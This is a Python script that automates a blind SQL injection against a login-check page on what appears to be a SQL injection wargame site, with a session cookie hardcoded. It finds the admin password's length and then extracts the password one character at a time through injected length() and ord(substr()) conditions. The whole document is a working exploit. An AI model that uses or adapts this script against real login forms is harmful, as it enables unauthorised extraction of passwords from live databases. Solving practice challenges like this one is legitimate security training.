import requests
import string

header = {"Cookie": "PHPSESSID=93bvl3l66u57rtt993gi4tn90d;"}
url = "https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php"
string_data = string.digits + string.ascii_letters

print(string_data)

pw = ""
pw_len = 1

# find pw length
while True:
    data = "?pw=' or id='admin' and length(pw)={}%23".format(str(pw_len))
    response = requests.get(url + data, headers=header)
    if response.text.find("Hello admin") != -1:
        break
    print("[*] Finding... : " + str(pw_len))
    pw_len += 1
print("[+] Get pw Length : " + str(pw_len))

# find pw
for idx in range(1, pw_len + 1):
    for i in string_data:
        # data = "?pw=' or id='admin' and pw like '{}{}%".format(pw,i)
        # data = "?pw=' or id='admin' and substr(pw,{},1)={}%23".format(idx,i)
        data = "?pw=' or id='admin' and ord(substr(pw,{},1))={}%23".format(idx,ord(i))
        # print(data)
        response = requests.get(url + data, headers=header)
        if response.text.find("Hello admin") != -1:
            pw = pw + i
            print("[*] Finding... : " + pw)
            break
print("[+] Found pw : " + pw)